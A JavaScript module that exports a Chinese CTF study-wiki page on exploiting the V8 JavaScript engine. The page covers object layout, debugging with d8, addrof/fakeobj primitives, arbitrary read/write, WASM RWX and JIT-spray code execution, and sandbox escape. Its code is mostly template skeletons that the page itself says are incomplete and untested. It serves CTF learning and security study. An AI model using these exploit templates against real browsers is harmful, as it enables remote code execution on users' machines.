const n="Pwn-浏览器与V8利用",e="Pwn-浏览器与V8利用",r="把 JS 引擎（主要是 V8）的类型混淆 / 越界读写变成 addrof + fakeobj 原语，再搭出任意读写，最后经 WASM RWX 页或 JIT 拿 code execution。本页给对象布局与指针压缩速查、`--allow-natives-syntax` 调试骨架、「观测到什么 ⇒ 用哪个手法」判据表，以及完整利用链模板。",a=`# Pwn-浏览器与V8利用

> 把 JS 引擎（主要是 V8）的类型混淆 / 越界读写变成 addrof + fakeobj 原语，再搭出任意读写，最后经 WASM RWX 页或 JIT 拿 code execution。本页给对象布局与指针压缩速查、\`--allow-natives-syntax\` 调试骨架、「观测到什么 ⇒ 用哪个手法」判据表，以及完整利用链模板。

## 一、拿到疑似 V8 漏洞后的 0 号动作

先把「用什么跑、什么版本、哪些缓解开着」三件事确定，再动利用——V8 的内部偏移**每几个大版本就会动**，照抄旧 writeup 的常量必翻车。

\`\`\`bash
# 1) 确认载体与版本（CTF 里绝大多数给的是 d8 或 node，少数给完整 Chrome）
./d8 --version
node --version

# 2) 确认能不能用 intrinsic（几乎所有利用脚本都依赖它）
./d8 --allow-natives-syntax -e "%DebugPrint([]);" 2>&1 | head

# 3) 确认 sandbox / 指针压缩是否开启（决定 R/W 能不能出 4GB cage）
./d8 --allow-natives-syntax -e "print(%GetHeapUsage ? 'ok' : 'no');" 2>&1 | head
\`\`\`

**载体判据表：**

| 你拿到的东西 | 利用落点 | 说明 |
|---|---|---|
| 单个 \`d8\` 可执行文件 | 直接 d8 内 RCE，读 flag / 起 shell | CTF 主力形态，通常 \`v8_enable_sandbox=false\` |
| \`node\` + 恶意 JS | node 进程内 RCE | 结构同 d8，但无 \`%DebugPrint\` 等 intrinsic |
| 完整 Chrome + 触发页面 | renderer RCE → 再谈 sandbox escape / Mojo | 真正浏览器题，见第八节 |
| 只有一段 JS + 一个「跑它就给我 shell」的说明 | 就是上面任一种，看成 d8 | 先 \`--allow-natives-syntax\` 试着跑 |

写完 \`poc.js\` 后统一用 \`./d8 --allow-natives-syntax poc.js\` 跑；报错优先怀疑 intrinsic 名字或版本差异，其次才是利用逻辑。

## 二、对象布局与指针压缩速查（背下来能省一半调试时间）

V8 用 **tagged pointer**：最低位区分 SMI 与堆对象。指针压缩（V8 ≥ 8.0）后，堆对象用 **32 位压缩指针**（相对 cage base 的偏移），cage 是一个 4GB 对齐区。

| 概念 | 规则 |
|---|---|
| SMI（小整数） | \`value << 1\`（最低位 0） |
| HeapObject 引用 | \`cage_base + compressed_offset\`，低 32 位是偏移 |
| 压缩指针还原 | \`full = cage_base + (u32 & 0xffffffff)\`（写 exp 时常见 \`>> 1n << 1n\` 之类对齐处理） |
| Map（隐藏类） | 定义对象形状：属性名、类型、偏移；**改 Map = 改整个对象的解释方式** |
| Elements kind | 数组内部存储类型，见第四节 |

**堆对象通用头（64 位 + 指针压缩）：**

\`\`\`
+0x00: Map 指针（压缩，32 位偏移）
+0x04: Properties / Hash
+0x08: Elements 指针（压缩）
+0x0C: Length（数组类对象）
+0x10: 内联属性 或 backing store 数据（第一个元素）
\`\`\`

**JSArray / 元素数组要记的两点：**

- 数组元素实际存在 **elements backing store**（一个单独的 FixedArray），JSArray 头里的 \`Elements\` 字段指向它。FP64 数组（\`PACKED_DOUBLE_ELEMENTS\`）的元素是**裸 8 字节 double**，对象数组（\`PACKED_ELEMENTS\`）的元素是**压缩指针**——这正是类型混淆能吐指针的原因。
- \`ArrayBuffer\` 的 \`backing_store\` 是**指向外部内存的原始/沙箱指针**，不受 GC 搬动影响，所以「改写 backing_store 得到任意读写」是最稳的落点。

⚠️ 上表偏移随 V8 版本与是否启用 sandbox 变化，**先 \`%DebugPrint\` 实测**再写死常量（\`%DebugPrint(arr)\` 会打印 map、elements、length 等字段）。

## 三、JIT 流水线与 \`--allow-natives-syntax\` 调试

**编译流水线（记这条链，理解 bug 出在哪一级）：**

\`\`\`
JS 源码 → Parser → AST → Ignition(字节码) → Sparkplug(基线, ≥9.1)
        → Maglev(中档, ≥10.2) → TurboFan(优化 JIT，投机优化) → 投机失败则 Deopt 回字节码
\`\`\`

类型混淆、越界消除这类 bug 大多出在 **TurboFan 的投机优化**：它基于 profiling 假定「这个数组一直是 double 数组」，一旦前提被打破而又没去优化，就产生类型混淆 / 越界。

**强制触发优化（两种写法）：**

\`\`\`javascript
// 写法 A：热循环跑够次数，让 TurboFan 自己优化
for (let i = 0; i < 100000; i++) vuln(arr);

// 写法 B：d8 intrinsic 直接点名（调试/CTF 首选，确定性强）
%PrepareFunctionForOptimization(vuln);
vuln(arr); vuln(arr);
%OptimizeFunctionOnNextCall(vuln);
vuln(arr);   // 这一跑进入优化后的代码
\`\`\`

**d8 常用 intrinsic：**

\`\`\`javascript
%DebugPrint(obj);                       // 打印对象内部表示：map/elements/length
%OptimizeFunctionOnNextCall(func);      // 下一次调用强制 TurboFan 优化
%PrepareFunctionForOptimization(func);  // 标记待优化
%CollectGarbage('major');               // 强制 GC（调堆布局时用）
%SystemBreak();                         // 下 INT3，挂 GDB 断点用
\`\`\`

**命令行与 GDB：**

\`\`\`bash
d8 --allow-natives-syntax poc.js                   # 开 intrinsic
d8 --allow-natives-syntax --trace-turbo poc.js     # 导出 TurboFan IR（turbo-*.json）
d8 --allow-natives-syntax --print-opt-code poc.js  # 打印优化后的机器码
# IR 可视化：Turbolizer 打开 --trace-turbo 生成的 turbo-*.json

gdb ./d8
(gdb) b v8::internal::Runtime_DebugPrint   # 在 %DebugPrint 处断下
(gdb) r --allow-natives-syntax poc.js      # 运行
(gdb) job <addr>                           # V8 GDB helper：按 V8 语义打印该地址对象
(gdb) jst                                  # 打印 JS 调用栈
\`\`\`

从源码构建带调试的 d8（需要 depot_tools）：

\`\`\`bash
git clone https://chromium.googlesource.com/v8/v8.git && cd v8
gclient sync
gn gen out/debug --args='is_debug=true v8_enable_sandbox=false target_cpu="x64"'
ninja -C out/debug d8
\`\`\`

## 四、漏洞模式：观测到什么 ⇒ 用哪个手法

这是本页最该反复看的一张表。**先判断 bug 类别，再决定搭哪条原语**。

| 观测到的现象 | 漏洞类别 | 用哪个手法 |
|---|---|---|
| 优化后某数组被当成另一种 elements kind 解释 | JIT 类型混淆 | 制造 double↔object 混淆 → 直接得 addrof/fakeobj（第五节） |
| TurboFan 消除了 \`CheckBounds\`，索引能越界 | 越界消除 / Typer bug | OOB 读写相邻对象头 → 改 length / map（第四节末） |
| 对象属性访问在原型被改写后仍走旧形状 | 原型链混淆 | 优化前提被破坏却没 deopt → 属性读打到错误偏移 |
| \`SharedArrayBuffer\` + worker 同时改 | 竞态 | 并发修改导致类型不一致 → 混淆 |
| 内置函数边界差一 | builtin off-by-one | 字符串/数组边界 → 直接内存破坏原语 |
| \`%DebugPrint\` 里两个数组的 map 相同但一个被当另一种用 | elements kind 不一致 | 归一化到 double 数组读指针 |
| 有直接写原语但只在 cage 内 | sandbox 限制 | 改 ArrayBuffer backing_store（cage 内）或走 EPT（第七节） |

**Elements kind 与单向转换（混淆的物理基础）：**

| Elements kind | 存储 | 读出来是什么 |
|---|---|---|
| \`PACKED_SMI_ELEMENTS\` | tagged SMI | 小整数（31 位） |
| \`PACKED_DOUBLE_ELEMENTS\` | 裸 float64 | **原始 64 位 double** |
| \`PACKED_ELEMENTS\` | tagged 指针 | 对象引用 |
| \`HOLEY_*\` | 同上但带 hole | 稀疏数组 |

正常转换链是**单向**的：\`SMI → DOUBLE → ELEMENTS\`，只能往左不能往右。bug 的作用就是**在优化路径上强行把 ELEMENTS 当 DOUBLE 用**（读 → 泄指针；写 → 造假指针），或反过来。

**OOB 打相邻对象**：V8 新生代按 bump pointer **顺序分配**，所以控制分配顺序就能保证相邻：

\`\`\`javascript
// 依次分配 ⇒ 内存里相邻
let oob_arr = [1.1, 2.2, 3.3];        // double 数组，越界源
let victim  = [{}];                    // 对象数组，被改 map/length
let rw_buf  = new ArrayBuffer(0x100); // 被改 backing_store
// oob_arr 末尾 → victim 头 → rw_buf 头 依次相邻
// 从 oob_arr 越界写：改 victim 的 map 造混淆，或改 rw_buf 的 backing_store
\`\`\`

## 五、搭原语：addrof / fakeobj → 任意读写

**通用转换工具（几乎每份 exp 开头都是这段）：**

\`\`\`javascript
let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let u32 = new Uint32Array(buf);
let u64 = new BigUint64Array(buf);

function ftoi(f) { f64[0] = f; return u64[0]; }   // double 位模式 → 整数
function itof(i) { u64[0] = i; return f64[0]; }   // 整数位模式 → double
function lo(i)   { u64[0] = i; return u32[0]; }   // 低 32 位
function hi(i)   { u64[0] = i; return u32[1]; }   // 高 32 位
function hex(i)  { return '0x' + i.toString(16); }
\`\`\`

**两个核心原语（依赖具体的类型混淆 bug 来「接通」互通的数组对）：**

\`\`\`javascript
// addrof：拿到 JS 对象的堆地址（压缩指针）
// 前提：object_array 的元素（指针）能被 confused_float_array 当 double 读出来
function addrof(obj) {
    object_array[0] = obj;
    return ftoi(confused_float_array[0]);   // double 位模式 = 该对象的压缩指针
}

// fakeobj：把「地址」变成 JS 能引用的对象
// 前提：反向互通——写 double 能被 object_array 当指针读
function fakeobj(addr) {
    confused_float_array[0] = itof(addr);
    return object_array[0];
}
\`\`\`

**从 addrof + fakeobj 到任意读写**，最稳的两条落点：

1. **改 \`Float64Array\` 的 backing store**：\`addrof\` 出数组位置，伪造/改写好元素指针，让某 \`Float64Array\` 的元素指针指向目标地址，于是 \`arr[0]\` 就是任意地址的 8 字节读写。

\`\`\`javascript
let rw = new Float64Array(0x100);
// 用 fakeobj 造一个「元素指针 = target」的假 Float64Array（或直接改真数组的 elements）
function read64(addr)  { /* 把 fake 数组的 backing 指向 addr */ return fake_f64[0]; }
function write64(addr, v) { /* 同上 */ fake_f64[0] = v; }
\`\`\`

2. **改 \`ArrayBuffer\` 的 backing_store**：直接写 \`ArrayBuffer\` 头里的 backing_store 指针，再用 \`DataView\` 读写——因为 backing store 在外部、不受 GC 搬动，**这是最耐用的落点**。

\`\`\`javascript
let ab = new ArrayBuffer(0x100);
let dv = new DataView(ab);
// 改写 ab.backing_store = target 后：
// dv.getFloat64(0, true)  → 读 target 处 8 字节
// dv.setFloat64(0, val, true) → 写 target
\`\`\`

**GC 生存性（别忽略，不然跑一半炸）：**

| 坑 | 对策 |
|---|---|
| 对象被 compacting GC 搬走 | 提前分配大量对象触发 scavenge，把关键对象**晋升到老年代**（地址稳定） |
| 假对象被 GC 回收 | 保证假对象不在 GC 追踪区，或用真实对象承载 |
| 写坏指针触发 write barrier | 避免对污染过的指针触发写屏障 |
| 依赖弱引用 | 别用，会被清 |

\`\`\`javascript
// 晋升到老年代：先分配好目标对象，再灌满新生代触发 scavenge
let obj = {a: 1, b: 2};
for (let i = 0; i < 100000; i++) new Array(100);   // 冲掉新生代
// obj 现在在老年代，地址稳定
\`\`\`

## 六、Code Execution：WASM RWX 页与 JIT spray

拿到任意读写后，最后一步是**让 CPU 执行你写的字节**。

**WASM RWX（CTF 主力，最省事）：**

\`\`\`javascript
// 一段合法 wasm 模块 → JIT 编译出可执行页
let code = new Uint8Array([0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00, /* ... */]);
let mod = new WebAssembly.Module(code);
let inst = new WebAssembly.Instance(mod);

// 链：addrof(inst) → instance 结构 → jump_table_start / 代码指针 → RWX 页
// 用 write64() 把 shellcode 写进该页，再 inst.exports.func() 触发
\`\`\`

**JIT spray（WASM 不可用时的备选）：** 让 TurboFan 把受控的 **float 立即数**编进代码页，跳进立即数中间执行。例如把 NOP sled / shellcode 编码成 double 字面量：

\`\`\`javascript
function spray() {
    let x = -6.828527034422786e-229;  // 位模式 = 0x9090_9090_9090_9090（8 个 NOP 字节）
    // ... 换成编码了 shellcode 的一组 float 字面量 ...
}
// JIT 后代码页里出现 movabs rax, 0x9090909090909090 —— 跳进立即数即执行
\`\`\`

**两条路的取舍：**

| 场景 | 首选 |
|---|---|
| CTF 的 d8，\`v8_enable_sandbox=false\` | WASM RWX 页（写 shellcode 直接执行） |
| 现代 Chrome（W^X 强制，页要么 RW 要么 RX） | 找写入窗口 / JIT spray / 改跳表，见第七节 |
| 无 WASM 但能拿代码页地址 | JIT spray（注意 constant blinding 削弱） |
| 只能改栈/返回地址 | 转 ROP（见 [[Pwn-栈溢出与ROP]]） |

## 七、V8 Sandbox 与现代缓解

V8 ≥ 11.x 引入 **sandbox（cage 4GB）**：V8 堆、ArrayBuffer backing store、WASM memory、外部指针表都在 cage 内。此时**光有任意读写还不够**——\`ArrayBuffer.backing_store\` 变成 **sandbox 指针**，指不出 cage。

\`\`\`
进程虚拟地址空间
┌──────────────────────────────┐
│ V8 Sandbox Cage (4GB)         │
│  ├─ V8 Heap (JS 对象)         │
│  ├─ ArrayBuffer backing store │
│  ├─ WASM memory               │
│  └─ External Pointer Table    │
├──────────────────────────────┤
│ Cage 外（libc / Chrome 代码 / 栈） │
└──────────────────────────────┘
\`\`\`

**Sandbox 逃逸向量：**

| 向量 | 手法 |
|---|---|
| 外部指针表（EPT） | 改写 EPT 条目，使某外部对象指向任意地址；条目形如 \`EPT[i] = (ptr ^ tag) | type_bits\`，需按版本处理编码 |
| WASM 跳表 / 代码指针 | 覆盖 WASM 函数跳表入口指向 controlled shellcode |
| JIT 代码页破坏 | 借竞态 / 混淆指针写 JIT 代码页 |
| Mojo IPC（Chrome） | 从被打穿的 renderer 打浏览器进程，见第八节 |
| backing store seal 绕过 | 找类型混淆拿到未沙箱化的指针 |

**缓解对老手法的打击：**

| 缓解 | 影响 |
|---|---|
| 指针压缩（≥8.0） | 指针变 32 位，addrof 拿到的是压缩偏移，需 cage base 还原 |
| V8 sandbox（≥11.x） | 任意读写被限制在 cage 内，需逃逸 |
| W^X | WASM 页不再同时 RWX，写 shellcode 需窗口/跳表 |
| Constant blinding | JIT spray 的立即数被随机 XOR，需去盲 |

⚠️ CTF 的 d8 常常是 \`v8_enable_sandbox=false\` 编译的旧形态，**别把浏览器上的三重缓解复杂度无脑套到 CTF**；先按第一节确认真实环境。

## 八、Chrome 进程模型与沙箱逃逸概览

完整浏览器题要在 renderer RCE 之后再打一层。**进程模型：**

\`\`\`
Browser Process（特权，无 sandbox）
  ├─ Renderer Process 1（sandboxed）  ← V8 exploit 在这里拿到 RCE
  ├─ Renderer Process 2（sandboxed）
  ├─ GPU Process
  ├─ Network Process
  └─ Utility Processes
\`\`\`

**三段式链条：**

| 阶段 | 目标 | 例子 |
|---|---|---|
| Stage 1 | V8 / Blink DOM | 类型混淆 → renderer 内 shellcode |
| Stage 2 | Mojo IPC 层 | BlobRegistry / FileSystemManager / NetworkService 等接口的 UAF / 类型混淆 |
| Stage 3 | OS 级提权（若需要） | 浏览器进程内已无 sandbox，直接执行 |

**Chrome 内存布局速查：**

| 区域 | 内容 |
|---|---|
| V8 Cage (4GB) | JS 堆、WASM memory、ArrayBuffer store |
| PartitionAlloc | Blink DOM 对象、C++ 对象 |
| 系统 malloc | PartitionAlloc 之外的 Chrome C++ 分配 |
| mmap | 共享内存、文件映射 |

## 关键点

- **先确环境再写 exp**：\`d8 --version\` 定版本、\`%DebugPrint([])\` 验 intrinsic、确认 sandbox 是否开启。V8 内部偏移随版本变，旧 writeup 的常量别照抄。
- **两条原语是一切的核心**：\`elements kind\` 混淆（double↔object）→ \`addrof\` 泄指针、\`fakeobj\` 造假指针；拿到后**优先改 \`ArrayBuffer.backing_store\`**（GC 友好、落点最稳）。
- **优化要可控**：调试期一律用 \`%PrepareFunctionForOptimization\` + \`%OptimizeFunctionOnNextCall\` 点名优化，别靠跑 10 万次的玄学循环。
- **OOB 先控堆布局**：V8 新生代顺序分配，\`oob_arr → victim → rw_buf\` 按分配顺序相邻；改之前先用 \`%DebugPrint\` 确认相邻关系。
- **别死在 GC 上**：关键对象提前晋升老年代；假对象不要放进 GC 追踪区；避免对污染指针触发写屏障。
- **最后一步看缓解**：CTF d8（无 sandbox）→ WASM RWX 直接写 shellcode；现代 Chrome（W^X + sandbox）→ 跳表/EPT/JIT spray/ROP。
- **完整浏览器题 = 三段**：V8 拿 renderer RCE → Mojo IPC bug 打 browser process → 无 sandbox 执行；只做 Stage 1 往往不算通关。
- **调试三件套**：\`--allow-natives-syntax\` 加 intrinsic、\`--trace-turbo\` + Turbolizer 看 IR、\`--print-opt-code\` 看机器码；GDB 里 \`job\`/\`jst\` 直接按 V8 语义看对象与栈。

## 关联

- [[Pwn-高级利用原语]] —— 本页的 addrof/fakeobj → 任意读写，正是那页通用原语体系在 JS 引擎里的实例；先读那页建立「原语 → 链」的心智模型。
- [[Pwn-堆利用]] —— 堆布局、顺序分配、GC/释放时机与 native 堆同源；OOB 打相邻对象头的思路直接复用。
- [[Pwn-栈溢出与ROP]] —— 当 code page 拿不到、只剩栈可写时，最后一跳转 ROP，两页在「控制流劫持」处交接。
- [[逆向-反调试与混淆对抗]] —— \`%SystemBreak\` + GDB 调试、JIT 机器码分析、Turbolizer 读 IR 都属于逆向手法，两页工具重叠。
- [[Web-客户端攻击与前端安全]] —— XSS 是打进浏览器的入口，那页讲前端攻击面，本页讲打进去之后如何把 JS 引擎 bug 变成 RCE。
- [[CTF-常用工具清单]] —— d8、Turbolizer、GDB V8 helper（job/jst）、depot_tools 构建命令的位置。

## 存疑 / 矛盾

- ⚠️ **对象偏移与内部结构随版本剧烈变化**：\`Map/Properties/Elements\` 都在头部，但 \`JSTypedArray\`、\`ArrayBuffer\`、\`ExternalPointerTable\` 的具体字段偏移与编码（\`tag\`、\`type_bits\`）每几个大版本就动。本页的 \`+0x00/+0x04/+0x08/+0x0C/+0x10\` 只是**通用头**，元素数组与 typed array 内部布局必须 \`%DebugPrint\` / GDB 实测，**不能当定值**。
- ⚠️ **WASM RWX 已是历史形态**：现代 Chrome 强制 W^X，WASM 页不再同时可写可执行；「写 shellcode 进 RWX 页直接跑」只在老版本/CTF 的 \`d8\` 上成立。JIT spray 也因 constant blinding 被大幅削弱。判「能不能直接写代码页」永远以**目标实际行为**为准。
- ⚠️ **sandbox 相关结论与 CTF 环境可能相反**：本页第七节的 EPT / cage 逃逸针对 V8 ≥ 11.x 的 Chrome；而 CTF 的 d8 多为 \`v8_enable_sandbox=false\`（第三节构建命令即如此），此时根本没有 cage 限制，硬套逃逸链反而绕远路。
- ⚠️ **正文代码是模板骨架，不是可直接通关的 exploit**：\`addrof\`/\`fakeobj\` 依赖「某个具体 bug 把两个数组接通」，本页没有真实 bug 可填；\`read64\`/\`write64\` 是伪代码说明意图，实际需按 bug 补全。**未逐条上机实测**，只保证结构与方法论正确。
- ⚠️ **与库内页存在重叠**：原语构造与 [[Pwn-高级利用原语]] 重叠、堆布局与 GC 与 [[Pwn-堆利用]] 重叠、调试手法与 [[逆向-反调试与混淆对抗]] 重叠；本页的独有价值在「V8 特有的对象布局 + elements kind 混淆 + sandbox/W^X 缓解」这三块，通用堆/原语细节回对应页看。
- ⚠️ **「指针压缩后 addrof 拿到什么」易误解**：拿到的是相对 cage base 的 **32 位偏移**（或带 tag 的压缩值），不是完整 64 位地址；做任意读写前往往需要 cage base（可用 \`%DebugPrint\` 或泄漏得到），这一步在多数 writeup 里被一笔带过，实际是常踩的坑。
- ⚠️ **Chrome 沙箱逃逸（第八节）高度依赖具体 Mojo 接口的当时实现**：\`BlobRegistry\`/\`FileSystemManager\` 等接口会随 Chrome 版本增删与加固，「打哪个接口」是经验而非定理；有完整 Chrome 题时优先查该版本近期 CVE 而非套模板。

## 来源

- 糯米内建知识整理 · 2026-10-05，提炼自 browser-exploitation-v8/SKILL.md 技能文档（正文未逐条上机实测，边界见「存疑 / 矛盾」）
- [SKILL 原文](../../01-原料/收藏/技能文档/browser-exploitation-v8/SKILL.md) —— 2026-10-05 归档进库
- [SKILL 原文](../../01-原料/收藏/技能文档/browser-exploitation-v8/V8_EXPLOITATION_PATTERNS.md) —— 2026-10-05 归档进库
`,o="concept",t="pwn",i={internal:["CTF-常用工具清单","Pwn-堆利用","Pwn-栈溢出与ROP","Pwn-高级利用原语","Web-客户端攻击与前端安全","逆向-反调试与混淆对抗"],unresolvedCount:0},s={name:n,title:e,summary:r,content:a,section:o,group:t,links:i};export{a as content,s as default,t as group,i as links,n as name,o as section,r as summary,e as title};
